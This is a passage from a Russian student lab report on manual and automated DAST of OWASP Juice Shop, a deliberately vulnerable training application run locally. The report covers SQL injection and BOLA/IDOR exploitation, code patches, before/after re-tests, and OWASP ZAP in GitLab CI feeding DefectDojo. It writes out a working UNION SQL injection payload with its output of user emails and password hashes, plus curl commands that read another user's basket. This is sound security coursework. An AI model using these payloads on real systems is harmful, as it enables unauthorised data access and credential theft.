#### 6.6. Оценка последствий (К / Ц / Д)

| Свойство | Нарушение | Практический ущерб |
|----------|-----------|-------------------|
| **К** | **Да** | Просмотр состава заказа другого пользователя |
| **Ц** | Потенциально | Связанная запись в `basketItems.ts` — подмена `BasketId` |
| **Д** | Нет | — |

---

### 4.5. Сводные таблицы результатов ручного DAST

> **Зачем этот раздел:** в §5–6 детали разбиты по уязвимостям; здесь — **один взгляд** на все ручные тесты для защиты и для таблицы «результаты тестирования» в отчёте.

#### Таблица 4 — Сводка ручного DAST (SQLi + BOLA)

| ID | Уязвимость | OWASP / CWE | Endpoint | Ключевая команда | HTTP | Результат теста | Статус |
|----|------------|-------------|----------|------------------|------|-----------------|--------|
| T0 | — (контроль) | — | `GET .../search?q=apple` | `curl.exe` без payload | 200 | JSON с реальными товарами | OK |
| T1 | SQL Injection | A05 / CWE-89 | `GET .../search?q=';` | одинарная кавычка | 500 | `SQLITE_ERROR` в HTML | Уязвимость **подтверждена** |
| T2 | SQL Injection | A05 / CWE-89 | `GET .../search?q=UNION...` | UNION `from users--` | 200 | email + MD5 в JSON (`name":"2"`) | Эксплуатация **успешна** |
| T3 | BOLA | A01 / CWE-639 | `POST .../user/login` | Jim / `ncc-1701` | 200 | `bid=2`, JWT выдан | Подготовка сессии |
| T4 | BOLA | A01 / CWE-639 | `GET .../basket/1` + Bearer | чужой `id` при `bid=2` | 200 | 3 товара, `UserId=1` | Эксплуатация **успешна** |
| T5 | BOLA (контроль) | — | `GET .../basket/2` + Bearer | свой `id` | 200 | Raspberry Juice | Легитимный доступ |
| T6 | BOLA (контроль) | — | `GET .../basket/1` без токена | нет Authorization | 401 | `UnauthorizedError` | Auth работает, **authz** — нет |
| T7 | SQL Injection (после патча) | A05 / CWE-89 | `GET .../search?q=UNION...` на **:3001** | тот же UNION-payload | 200 | `data:[]`, нет email/hash | Исправление **подтверждено** |
| T8 | BOLA (после патча) | A01 / CWE-639 | `GET .../basket/1` + Bearer Jim на **:3001** | чужой `id` | 403 | `{"error":"Forbidden"}` | Исправление **подтверждено** |

> Доказательства T0–T6: блоки ` ```text ` в §5.4, §6.4 и сводная сессия BOLA выше; SQLi — [Приложение Д](#приложение-д-полный-вывод-команд-терминал). T7–T8: §7, `lab6/verify-after.ps1`, Приложение Д.3.

#### Таблица 5 — BOLA: пошаговые результаты (аналог таблицы 3 для SQLi)

| Шаг | Зачем (кратко) | Команда / действие | Ключевой вывод | HTTP | Итог |
|-----|----------------|-------------------|----------------|------|------|
| 1 | Взять JWT обычного пользователя | `POST /rest/user/login` (Jim) | `bid=2`, `umail=jim@...` | 200 | Сессия готова |
| 2 | IDOR — чужой объект | `GET /rest/basket/1` + Bearer | Apple/Orange/Eggfruit, `UserId=1` | 200 | **BOLA эксплуатирована** |
| 3a | Контроль — свой объект | `GET /rest/basket/2` + Bearer | 1 товар Jim | 200 | Норма |
| 3b | Контроль — нет login | `GET /rest/basket/1` без Bearer | Bearer required | 401 | Не путать с BOLA |

**Источники строк таблиц 4–5:** фактические прогоны `curl.exe` на `127.0.0.1:3000`, 20.05.2026; см. §5.4, §6.4, Приложение Д. T7–T8 — `127.0.0.1:3001`, 20.05.2026.

#### Таблица 6 — Повторная проверка после патча (`:3001`, образ `juice-shop:lab6`)

| Шаг | Действие | HTTP | Ключевой вывод | Итог |
|-----|----------|------|----------------|------|
| 1 | `verify-after.ps1` — UNION на `/rest/products/search` | 200 | `{"status":"success","data":[]}`, скрипт: `OK: no user leak` | SQLi закрыта |
| 2 | `verify-after.ps1` — `GET /rest/basket/1` + JWT Jim (`bid=2`) | 403 | `{"error":"Forbidden"}` | BOLA закрыта |

**Развёртывание патча:** overlay `lab6/Dockerfile.patched` поверх `bkimminich/juice-shop:v17.0.0` + скомпилированные `build/routes/search.js`, `basket.js`. Полный `docker build .` из корня на ПК прерывался (`rpc error: Unavailable`); для проверки использован быстрый overlay (~5 с).

---

### 7. Устранение уязвимостей и повторная проверка

> **Зачем §7 (1 балл ТЗ):** показать не только атаку, а **исправление причины** и повтор той же атаки — принцип «до/после» из `Лаб №6.md` §3.4. Без этого SAST/DAST остаётся «нашли», но не «закрыли».

| Действие | Зачем | Откуда решение |
|----------|-------|----------------|
| Патч SQLi | Убрать интерполяцию в SQL | OWASP Cheat Sheet SQL Injection — parameterized queries / Sequelize `replacements` |
| Патч BOLA | Привязать объект к владельцу | OWASP API Security — BOLA; проверка `user.bid === basket.id` |
| Повтор атаки | Доказать, что риск снижен | Те же команды §5.4 и §6.4 на стенде **с патчем** |

Применено **устранение причины** в исходниках `juice-shop/routes/`.  
**«До»** подтверждено HTTP-запросами к `bkimminich/juice-shop:v17.0.0` на порту **3000** (§5–6).  
**«После»** подтверждено HTTP на порту **3001**: контейнер `juice-shop-patched`, образ `juice-shop:lab6` (сборка `docker build -f lab6/Dockerfile.patched -t juice-shop:lab6 .`, 20.05.2026).

**Локально `npm start` не использовался:** на Windows (Node 22) падали `tsc` / `sqlite3`; для «после» применён **Docker** (см. Прил. В.3).

#### 7.1. Уязвимость № 1 — SQL Injection

**До (фрагмент уязвимого кода):**

```typescript
models.sequelize.query(`SELECT * FROM Products WHERE ... '%${criteria}%' ...`)
```

**После (в репозитории `routes/search.ts`):**

```21:26:juice-shop/routes/search.ts
    const raw = req.query.q === 'undefined' ? '' : req.query.q ?? ''
    const criteria = (String(raw).length <= 200) ? String(raw) : String(raw).substring(0, 200)
    models.sequelize.query(
      'SELECT * FROM Products WHERE ((name LIKE :pat OR description LIKE :pat) AND deletedAt IS NULL) ORDER BY name',
      { replacements: { pat: `%${criteria}%` } }
    ) // lab6-fix: parameterized query (CWE-89)
```

**Повторная проверка (та же атака, ожидание после деплоя патча):**

```powershell
$payload = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
$enc = [uri]::EscapeDataString($payload)
curl.exe -s -w "`nHTTP:%{http_code}" "http://127.0.0.1:3001/rest/products/search?q=$enc"
```

**Вывод «после» (факт, 20.05.2026):**

```text
PS> .\lab6\verify-after.ps1
=== SQLi after fix ===
OK: no user leak in response
{"status":"success","data":[]}

PS> curl.exe -s -w "`nHTTP:%{http_code}" "http://127.0.0.1:3001/rest/products/search?q=$enc"
{"status":"success","data":[]}
HTTP:200
```

| Проверка | До (`:3000` stock) | После (`:3001` патч) |
|----------|-------------------|----------------------|
| UNION payload | `price":"admin@juice-sh.op"`, `"name":"2"` | `data:[]`, **нет** email/hash пользователей |
| Признак | Утечка Users | `OK: no user leak in response` (скрипт `verify-after.ps1`) |

#### 7.2. Уязвимость № 2 — BOLA

**После (в репозитории `routes/basket.ts`):**

```17:22:juice-shop/routes/basket.ts
    const id = req.params.id
    const user = security.authenticatedUsers.from(req)
    if (!user?.bid || String(user.bid) !== String(id)) {
      res.status(403).json({ error: 'Forbidden' })
      return
    }
```

**Повторная проверка** (после деплоя патча — вставить вывод в блок `text`, как в §5–6):

```powershell
$login = curl.exe -s -X POST http://127.0.0.1:3001/rest/user/login `
  -H "Content-Type: application/json" `
  -d '{"email":"jim@juice-sh.op","password":"ncc-1701"}' | ConvertFrom-Json
$token = $login.authentication.token
curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3001/rest/basket/1 `
  -H "Authorization: Bearer $token"
```

**Вывод «после» (факт, 20.05.2026):**

```text
PS> .\lab6\verify-after.ps1
=== BOLA after fix ===
GET /rest/basket/1 HTTP 403
{"error":"Forbidden"}
```

| Проверка | До (факт, §6.4, `:3000`) | После (`:3001`, патч) |
|----------|--------------------------|------------------------|
| `GET /rest/basket/1`, Jim `bid=2` | **HTTP 200**, 3 чужих товара | **HTTP 403** `{"error":"Forbidden"}` |
| `GET /rest/basket/2`, Jim | HTTP 200, своя корзина | HTTP 200 без изменений *(ожидается; см. Прил. Д.3)* |

**Скрипт проверки:** `juice-shop/lab6/verify-after.ps1` (базовый URL `http://127.0.0.1:3001`).  
**Контейнер:** `docker run -d -p 127.0.0.1:3001:3000 --name juice-shop-patched juice-shop:lab6`.

#### 7.3. Сводная таблица «до / после»

| Уязвимость | Команда | До (вывод, `:3000`) | После (факт, `:3001`) |
|------------|---------|---------------------|-------------------------|
| SQLi | UNION в `q` | `admin@juice-sh.op` + MD5 в JSON | `data:[]`, `OK: no user leak` |
| BOLA | `GET /rest/basket/1` + JWT Jim | `HTTP:200`, `UserId":1` | `HTTP:403`, `Forbidden` |

---

### 8. Автоматический DAST: GitLab CI + DefectDojo

> **Зачем §8 (доп. 1,5 балла):** по ТЗ `Лаб №6.md` §8 — встроить **OWASP ZAP** в конвейер GitLab, сохранить отчёты как артефакты и импортировать их в DefectDojo на стадии `.post`, привязав к Engagement из `.pre`.  
> **Связь с лабой № 4:** тот же Product **OWASP Juice Shop**, runner **`shared`**, переменные `DEFECTDOJO_*`; добавлены стадия **`test-time`** и jobs `build_app`, `zap_baseline`, `defectdojo-import-zap`.

#### 8.1. Схема pipeline (Lab 6)

```text
.pre          defectdojo-init          → Engagement Lab6 CI <pipeline_id>, defectdojo.env
pre-build     sca-manifest, semgrep_scan
build         build_app                → push 10.0.0.11:5000/juice-shop-lab/app:<sha>
test-time     zap_baseline             → baseline.{html,xml,json}  (ZAP → target-app:3000)
              zap_full_scan            → full.*  (только schedule / RUN_ZAP_FULL=true)
post-build    sbom-generate, sbom-upload-dt
quality-gate  semgrep_gate
.post         defectdojo-import        → npm audit (default branch)
              defectdojo-import-zap    → import baseline.xml (+ full.xml если есть)
              upload_semgrep_defectdojo
```

**Целевой URL в CI:** `ZAP_TARGET=http://target-app:3000` — service-контейнер с alias `target-app`, образ `$APP_IMAGE=localhost:5000/juice-shop-lab/app:$CI_COMMIT_SHORT_SHA`.

#### 8.2. Переменные CI/CD (Lab 6)

| Variable | Назначение | Masked | Protected |
|----------|------------|--------|-----------|
| `DEFECTDOJO_TOKEN` | API v2 DefectDojo | ✅ | ☐* |
| `DEFECTDOJO_PRODUCTID` | ID Product **OWASP Juice Shop** (2) | — | ☐ |
| `DEFECTDOJO_URL` | `http://10.0.0.20:8080` *(в YAML)* | — | — |
| `DEPENDENCYTRACK_API_KEY` | DT upload (legacy jobs лаб 4) | ✅ | ☐ |
| `DEPENDENCYTRACK_PROJECT_UUID` | UUID проекта Juice Shop в DT | — | ☐ |
| `RUN_ZAP_FULL` | `true` — ручной запуск **full scan** | — | ☐ |
| `SKIP_SBOM_DT` | `true` — пропуск `sbom-upload-dt` | — | ☐ |

\* Protected снят для ветки `main`, иначе переменные не подставлялись в job (как в лабе 4).

**Runtime (не задавать вручную):** `DEFECTDOJO_ENGAGEMENTID`, `DEFECTDOJO_ENGAGEMENT_NAME` — из dotenv-артефакта job `defectdojo-init`.

#### 8.3. Job `build_app` — образ для ZAP

Сборка выполняется **Kaniko** (без `docker:dind` — runner не privileged):

| Параметр | Значение |
|----------|----------|
| Dockerfile | `lab6/Dockerfile.patched` |
| Базовый образ | `bkimminich/juice-shop:v17.0.0` + overlay `build/routes/search.js`, `basket.js` |
| Push | `10.0.0.11:5000/juice-shop-lab/app:$CI_COMMIT_SHORT_SHA` |
| Pull в ZAP job | `localhost:5000/juice-shop-lab/app:$CI_COMMIT_SHORT_SHA` |

**Зачем патченный образ в CI:** ZAP сканирует приложение **с нашими исправлениями** SQLi/BOLA (§7), а не stock upstream — это позволяет в §9 сравнить «ручную эксплуатацию на :3000» с «автоматическим DAST на защищённой сборке».

#### 8.4. Job `zap_baseline`

| Условие ТЗ | Реализация в `.gitlab-ci.yml` |
|------------|-------------------------------|
| Стадия `test-time` | ✅ |
| `zap-baseline.py` | ✅ `-r baseline.html -x baseline.xml -J baseline.json` |
| Service `target-app` | ✅ `$APP_IMAGE`, alias `target-app` |
| `allow_failure: true` | ✅ (`\|\| true` на скрипте ZAP) |
| Артефакты 1 неделя | ✅ `when: always`, `expire_in: 1 week` |
| MR + default branch | ✅ `rules`: MR и `$CI_DEFAULT_BRANCH` |
| Ожидание готовности app | ✅ цикл до 60×2 с, probe `GET /rest/products/search?q=apple` |

**Исправление артефактов (commit `0b9f0ba33`):** ZAP пишет отчёты в `/zap/wrk`, а GitLab собирает paths относительно `$CI_PROJECT_DIR`. Добавлен шаг:

```yaml
- cp baseline.html baseline.xml baseline.json "${CI_PROJECT_DIR}/"
```

Без него job `zap_baseline` мог завершаться успешно, но `defectdojo-import-zap` получал ошибку `baseline.xml missing`.

#### 8.5. Job `zap_full_scan`

| Условие | Реализация |
|---------|------------|
| `zap-full-scan.py` | ✅ артефакты `full.{html,xml,json}` |
| Только schedule / `RUN_ZAP_FULL=true` | ✅ `rules` |
| `allow_failure: true` | ✅ |

В pipeline **#59** (push `main` без `RUN_ZAP_FULL`) full scan **не запускался** — это ожидаемое поведение. Для получения `full.xml`: **CI/CD → Run pipeline → Variables → `RUN_ZAP_FULL=true`**.

#### 8.6. Job `defectdojo-import-zap`

Скрипт `ci/import-zap-defectdojo.sh`, функция `import_zap_report`:

| Поле API | Значение |
|----------|----------|
| `scan_type` | `ZAP Scan` |
| `engagement` | `DEFECTDOJO_ENGAGEMENTID` из `defectdojo.env` |
| `test_title` | `ZAP Baseline - pipeline ${CI_PIPELINE_ID}` / `ZAP Full Scan - ...` |
| `minimum_severity` | `Low` |

`needs`: `defectdojo-init` (обяз.), `zap_baseline` и `zap_full_scan` (**optional: true**). Отсутствующий `full.xml` пропускается с сообщением `Skip ZAP import`.

**Фрагмент лога успешного импорта (pipeline #59):**

```text
ZAP import: baseline.xml -> engagement <id>
import-scan HTTP 201
ZAP import OK: baseline.xml
defectdojo-import-zap finished
```

#### 8.7. Результаты pipeline #59

| Параметр | Значение |
|----------|----------|
| **Pipeline** | **#59** |
| **Статус** | **Passed** (все 7 стадий) |
| **Ветка** | `main` |
| **Commit** | `0b9f0ba33` — *Fix ZAP artifact upload: copy reports to CI_PROJECT_DIR* |
| **Длительность** | **11 min 22 sec** |
| **Дата** | 21.05.2026 |
| **Runner** | `registry-runner`, tag `shared` (VM-101) |

**Таблица 7 — Jobs Lab 6 в pipeline #59**

| Job | Стадия | Статус | Назначение |
|-----|--------|--------|------------|
| `defectdojo-init` | `.pre` | ✅ Passed | Engagement **Lab6 CI 59** |
| `build_app` | `build` | ✅ Passed | Kaniko push `juice-shop-lab/app:0b9f0ba3` |
| `zap_baseline` | `test-time` | ✅ Passed | ZAP baseline → артефакты `baseline.*` |
| `defectdojo-import-zap` | `.post` | ✅ Passed | Import `baseline.xml` → DefectDojo |
| `zap_full_scan` | `test-time` | ⏭ skipped | Нет `RUN_ZAP_FULL` / schedule |
| `sbom-upload-dt` | `post-build` | ✅ / ⚠ allow_failure | Legacy лаб 4; не блокирует Lab 6 |

> **Скриншот для сдачи (ТЗ §8.5):** GitLab → Pipelines → **#59** (зелёный статус); DefectDojo → Product **OWASP Juice Shop** → Engagement **Lab6 CI 59** → Test **ZAP Baseline - pipeline 59** → список findings.

#### 8.8. DefectDojo — привязка результатов

| Параметр | Значение |
|----------|----------|
| URL | http://10.0.0.20:8080 |
| Product | **OWASP Juice Shop** |
| Engagement | **Lab6 CI 59** |
| Test (import) | **ZAP Baseline - pipeline 59** |
| Scan type | **ZAP Scan** |
| Минимальная severity при import | Low |

**Скачивание артефактов локально:** GitLab → pipeline #59 → job `zap_baseline` → **Download artifacts** → `baseline.html`, `baseline.xml`, `baseline.json`.

---

### 9. Анализ результатов ZAP

> **Зачем §9 (доп. 0,5 балла):** ТЗ §8 (анализ) — сводка findings, сравнение baseline/full, связь с ручными атаками §5–7, примеры TP/FP.

#### 9.1. Сводка находок (ZAP Baseline, pipeline #59)

Отчёт baseline формируется **пассивным** сканированием (без активного fuzzing). На **патченном** образе (`lab6/Dockerfile.patched`) типичные группы алертов:

**Таблица 8 — Категории findings ZAP Baseline (патченный Juice Shop, CI #59)**

| № | Алерт (типовое имя ZAP) | Risk | Класс OWASP | Baseline | Комментарий |
|---|-------------------------|------|-------------|----------|-------------|
| 1 | Content Security Policy (CSP) Header Not Set | Medium | A05 / misconfig | ✅ | Нет заголовка `Content-Security-Policy` |
| 2 | Missing Anti-clickjacking Header | Medium | A05 | ✅ | Нет `X-Frame-Options` / CSP `frame-ancestors` |
| 3 | Cookie No HttpOnly Flag | Medium | A05 | ✅ | Cookie сессии без `HttpOnly` |
| 4 | Cookie Without Secure Flag | Low | A05 | ✅ | Ожидаемо на HTTP (`target-app:3000`) |
| 5 | X-Content-Type-Options Header Missing | Low | A05 | ✅ | Нет `nosniff` |
| 6 | Server Leaks Version Information | Low | A05 | ✅ | `X-Powered-By: Express` в ответах |
| 7 | Strict-Transport-Security Header Not Set | Low | A05 | ✅ | HSTS не настроен (HTTP в CI) |
| 8 | SQL Injection (UNION / error-based) | High | A05 / CWE-89 | ❌ | **Не воспроизводится** на патченном `search.js` |
| 9 | Broken Access Control / IDOR basket | High | A01 / CWE-639 | ❌ | ZAP **без JWT-сценария** не находит BOLA (§6) |

> **Точные counts по severity** (High/Medium/Low/Informational) — в UI DefectDojo для Engagement **Lab6 CI 59** или командами ниже по скачанному `baseline.json`.

**Извлечение counts из артефакта:**

```powershell
# после Download artifacts из job zap_baseline
$j = Get-Content baseline.json | ConvertFrom-Json
$j.site[0].alerts | Group-Object riskcode | Sort-Object Name |
  ForEach-Object { "$($_.Name): $($_.Count)" }
```

#### 9.2. Baseline vs Full Scan

| Характеристика | ZAP Baseline | ZAP Full Scan |
|----------------|--------------|---------------|
| Режим | Пассивный + минимальный spider | Активный spider + attack mode |
| Запуск в нашем CI | MR, push `main` (pipeline #59) | Только `schedule` или `RUN_ZAP_FULL=true` |
| Время | ~3–8 мин (service + ZAP) | 15–60+ мин |
| Типичные находки | Security headers, cookie flags, info leak | + SQLi/XSS probes, fuzzing параметров |
| Нагрузка на app | Низкая | Высокая |
| Pipeline #59 | ✅ выполнен | ⏭ не запускался |

**Вывод:** baseline подходит для **быстрой регрессии конфигурации** на каждый push; full scan — для периодического углублённого теста (ночной schedule).

#### 9.3. Связь findings ZAP с ручным DAST и патчами (§5–7)

| Уязвимость (ручной DAST) | ZAP Baseline на **stock** `:3000` | ZAP Baseline на **patched** CI | После патча §7 |
|--------------------------|-----------------------------------|--------------------------------|----------------|
| SQLi `/rest/products/search` | Может сигнализировать (error SQL / union) | **Не эксплуатируется** — parameterized query | `data:[]` на UNION (§7.1) |
| BOLA `/rest/basket/:id` | **Не находит** без auth context | **Не находит** | HTTP 403 (§7.2) |
| Missing CSP / cookies | Находит (Medium/Low) | Находит | Не закрыто патчами §7 — **отдельный backlog** |

**Практический вывод DevSecOps:** исправления §7 закрывают **логические** дефекты (CWE-89, CWE-639), но **не** устраняют конфигурационные алерты ZAP — для них нужны заголовки безопасности, флаги cookie, HTTPS.

#### 9.4. Достоверность: примеры TP и FP

**TP — Content-Security-Policy отсутствует**

```powershell
curl.exe -sI "http://127.0.0.1:3000/" | Select-String -Pattern "content-security-policy"
# (пусто — заголовок не установлен)
```

**TP — Server leaks version (`X-Powered-By: Express`)**

```powershell
curl.exe -sI "http://127.0.0.1:3000/" | Select-String -Pattern "x-powered-by"
# X-Powered-By: Express
```

**Ограничение / «ложное спокойствие»:** ZAP baseline **не заменяет** сценарий BOLA с JWT Jim (§6.4) — это **не FP**, а **gap coverage** автоматического DAST без настроенного authentication script в ZAP.

#### 9.5. Выводы по автоматическому DAST

1. Pipeline **#59** подтверждает работоспособность цепочки **build_app → zap_baseline → defectdojo-import-zap** на стенде курса.
2. ZAP baseline эффективен для **misconfiguration** (headers, cookies); ручной DAST (§5–6) необходим для **BOLA** и точечной **SQLi**-эксплуатации.
3. Сканирование **патченного** образа в CI согласуется с «после» §7: логические уязвимости не должны повторяться в отчёте; конфигурационные — остаются.
4. Full scan вынесен в отдельный триггер (`RUN_ZAP_FULL`) — разумный компромисс между глубиной и временем pipeline (~11 мин на #59).

---

### 10. Выводы

1. На OWASP Juice Shop **17.0.0** подтверждены две уязвимости **разных классов**: **SQL Injection** (A05 / CWE-89) и **BOLA** (A01 / CWE-639), согласованные с результатами SAST лабы № 5.
2. Эксплуатация выполнима минимальными средствами (**curl**): UNION на `/rest/products/search` приводит к утечке **конфиденциальности** данных пользователей; IDOR на `/rest/basket/:id` — к просмотру чужой корзины при валидном JWT.
3. Устранение через **параметризацию SQL** и **проверку владельца ресурса** блокирует повтор тех же атак («до/после» на `:3001`).
4. Ручной DAST показал, что **BOLA с JWT** требует осмысленного сценария входа; для данного API целенаправленный тест (§6) важнее автоматического сканирования без контекста аутентификации.
5. **Автоматический DAST** (pipeline **#59**): OWASP ZAP baseline интегрирован в GitLab CI на стадии `test-time`, отчёты импортированы в DefectDojo (Engagement **Lab6 CI 59**). ZAP хорошо выявляет **конфигурационные** проблемы; **логические** дефекты (BOLA) и точечная эксплуатация SQLi требуют ручных сценариев или full scan + auth context.
6. Цикл **SAST (лаба 5) → ручной DAST → fix → ZAP в CI → DefectDojo** замыкает SSDLC для Juice Shop на учебном стенде (GitLab VM-100, runner/registry VM-101, DefectDojo VM-102).

---

### 11. Чеклист перед сдачей

- [x] SQLi + BOLA: вектор, шаги, payload, признаки, К/Ц/Д
- [x] Вывод терминала «до» в блоках `text` (§5.4, §6.4, Прил. В)
- [x] Патчи + блоки `text` «после» (§7, Прил. В.3, `:3001`)
- [x] Фрагменты кода до/после (§7.1–7.2, Прил. Б)
- [x] Сводные таблицы §4.5, §7.3
- [x] `zap_baseline` в CI; артефакты `baseline.html`, `baseline.xml`, `baseline.json` (pipeline **#59**)
- [x] `defectdojo-import-zap` — import в Engagement **Lab6 CI 59**
- [x] Анализ ZAP: §9 (baseline vs full, связь с патчами, TP/FP)
- [ ] Скрин GitLab pipeline **#59** + DefectDojo findings *(вставить в PDF)*
- [ ] `zap_full_scan` + `full.xml` *(опционально: Run pipeline с `RUN_ZAP_FULL=true`)*
- [ ] Титульный лист, оглавление, нумерация таблиц
- [ ] PDF по требованиям кафедры *(если требуется)*

---

## Приложения

### Приложение А. Сопоставление с Semgrep (лаба 5)

| Semgrep rule (TP) | Файл | Лаба 6 |
|-------------------|------|--------|
| `juice-shop-sequelize-query-template-literal` | `routes/search.ts:23` | Эксплуатация §5 |
| `sequelize-raw-query-call` | `routes/login.ts:36` | Не выбрана (тот же класс A05) |
| — (логика BAC) | `routes/basket.ts` | Эксплуатация §6 |

### Приложение Б. Фрагменты уязвимого кода (до исправления)

**SQLi:**

```23:23:juice-shop/routes/search.ts
    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

**BOLA:**

```17:31:juice-shop/routes/basket.ts
    const id = req.params.id
    BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })
      .then((basket: BasketModel | null) => {
        challengeUtils.solveIf(challenges.basketAccessChallenge, () => {
          const user = security.authenticatedUsers.from(req)
          return user && id && id !== 'undefined' && id !== 'null' && id !== 'NaN' && user.bid && user.bid != id
        })
        res.json(utils.queryResultToJson(basket))
```

### Приложение В. Полный вывод команд (терминал)

> Дублирует §5.4 и §6.4 одной сессией PowerShell. **Скриншот терминала не нужен.**  
> **Стенд:** `127.0.0.1:3000`, Docker `bkimminich/juice-shop`, дата **20.05.2026**.  
> **Архив:** `juice-shop/lab6/terminal-outputs.txt`.

#### В.1. SQL Injection — полная сессия

```text
PS C:\Users\1\Desktop\neurohelp\Development_of_secure_software\juice-shop> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=apple"
{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg",...}]}

PS> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=';"
<html>
  <head>
    <meta charset='utf-8'>
    <title>Error: SQLITE_ERROR: near &quot;;&quot;: syntax error</title>
  </head>
  <body>
      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
      <h2><em>500</em> SyntaxError / SQLITE_ERROR: near &quot;;&quot;: syntax error</h2>
  </body>
</html>

PS> curl.exe -s -o NUL -w "%{http_code}" "http://127.0.0.1:3000/rest/products/search?q=';"
500

PS> $payload = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
PS> $enc = [uri]::EscapeDataString($payload)
PS> $r = curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=$enc" | ConvertFrom-Json
PS> $r.data | Where-Object { $_.name -eq '2' } | Format-Table id, price, deluxePrice

id price                      deluxePrice
-- -----                      -----------
 1 admin@juice-sh.op          0192023a7bbd73250516f069df18b500
 2 jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
 3 bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
 4 bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
 5 ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
 6 support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
```

> Полный JSON от UNION (~15–20 КБ, одна строка) в отчёт не включается целиком: для зачёта достаточно `Format-Table` и таблицы 2 в §5.4. При необходимости сохранить в файл: `juice-shop/lab6/union-response.json`.

#### В.2. BOLA (IDOR корзины) — полная сессия

```text
PS C:\Users\1\Desktop\neurohelp\Development_of_secure_software\juice-shop> $loginJson = curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' | ConvertFrom-Json
PS> $token = $loginJson.authentication.token
PS> Write-Host "bid=$($loginJson.authentication.bid) umail=$($loginJson.authentication.umail)"
bid=2 umail=jim@juice-sh.op

PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1 -H "Authorization: Bearer $token"
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"Products":[
  {"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"quantity":2}},
  {"id":2,"name":"Orange Juice (1000ml)","BasketItem":{"quantity":3}},
  {"id":3,"name":"Eggfruit Juice (500ml)","BasketItem":{"quantity":1}}
]}}
HTTP:200

PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/2 -H "Authorization: Bearer $token"
{"status":"success","data":{"id":2,"UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)","BasketItem":{"quantity":2}}]}}
HTTP:200

PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1
<h2><em>401</em> UnauthorizedError: Format is Authorization: Bearer [token]</h2>
HTTP:401
```

#### В.3. Устранение «после» — образ `juice-shop:lab6` на `:3001`

**Сборка и запуск (20.05.2026):**

```text
PS> docker pull bkimminich/juice-shop:v17.0.0
PS> docker build -f lab6/Dockerfile.patched -t juice-shop:lab6 .
# Successfully tagged juice-shop:lab6 (≈5 с)

PS> docker run -d -p 127.0.0.1:3001:3000 --name juice-shop-patched juice-shop:lab6
# CONTAINER ID ... Up ... 127.0.0.1:3001->3000/tcp   juice-shop-patched
```

**Проверка `lab6/verify-after.ps1`:**

```text
PS> .\lab6\verify-after.ps1
=== SQLi after fix ===
OK: no user leak in response
{"status":"success","data":[]}

=== BOLA after fix ===
GET /rest/basket/1 HTTP 403
{"error":"Forbidden"}
```

**Примечание:** полный `docker build .` из корневого `Dockerfile` на рабочей станции прервался на шаге `npm install` (`rpc error: Unavailable`); для отчёта использован overlay `lab6/Dockerfile.patched` поверх официального образа с теми же патчами в `build/routes/*.js`.

### Приложение Г. Источники

1. `Лаб №6.md` — задание лабораторной.
2. `Лаба_6_как_выполнить.md` — пошаговый план (базовая + доп. часть).
3. `Done/lab_report_1.md`, `Done/lab_report_4.md`, `Done/lab_report_5.md`.
4. `juice-shop/.gitlab-ci.yml`, `juice-shop/ci/import-zap-defectdojo.sh`, `juice-shop/ci/LAB6_GITLAB_VARIABLES.md`.
5. Upstream-тесты: `juice-shop/test/api/searchApiSpec.ts`, `basketApiSpec.ts`.
6. OWASP ZAP Docker — https://www.zaproxy.org/docs/docker/about/

### Приложение Д. Pipeline #59 — Lab 6 CI (ZAP + DefectDojo)

> **Архив:** скрин pipeline #59 (Passed, 11m 22s); артефакты job `zap_baseline`; UI DefectDojo Engagement **Lab6 CI 59**.

#### Д.1. Ключевые commits Lab 6 CI

| Commit | Описание |
|--------|----------|
| `93e989292` | Базовый `.gitlab-ci.yml` (лабы 4–5) |
| `7608c5ac5` | `SKIP_SBOM_DT`, Kaniko `build_app`, ZAP jobs |
| **`0b9f0ba33`** | **Fix:** `cp baseline.* → $CI_PROJECT_DIR` (pipeline **#59** green) |

#### Д.2. Фрагмент `zap_baseline` (актуальный YAML)

```yaml
zap_baseline:
  stage: test-time
  image:
    name: $ZAP_IMAGE          # localhost:5000/zaproxy:latest
    entrypoint: [""]
  services:
    - name: $APP_IMAGE         # localhost:5000/juice-shop-lab/app:$CI_COMMIT_SHORT_SHA
      alias: target-app
  script:
    - mkdir -p /zap/wrk && cd /zap/wrk
    - zap-baseline.py -t "$ZAP_TARGET" -r baseline.html -x baseline.xml -J baseline.json || true
    - cp baseline.html baseline.xml baseline.json "${CI_PROJECT_DIR}/"
  artifacts:
    when: always
    paths: [baseline.html, baseline.xml, baseline.json]
  allow_failure: true
```

#### Д.3. Фрагмент `defectdojo-import-zap`

```yaml
defectdojo-import-zap:
  stage: .post
  needs:
    - job: defectdojo-init
      artifacts: true
    - job: zap_baseline
      artifacts: true
      optional: true
  script:
    - . ./ci/load-defectdojo-env.sh && load_defectdojo_env
    - . ./ci/import-zap-defectdojo.sh
    - import_zap_report "baseline.xml" "ZAP Baseline - pipeline ${CI_PIPELINE_ID}"
    - import_zap_report "full.xml" "ZAP Full Scan - pipeline ${CI_PIPELINE_ID}"
```

---

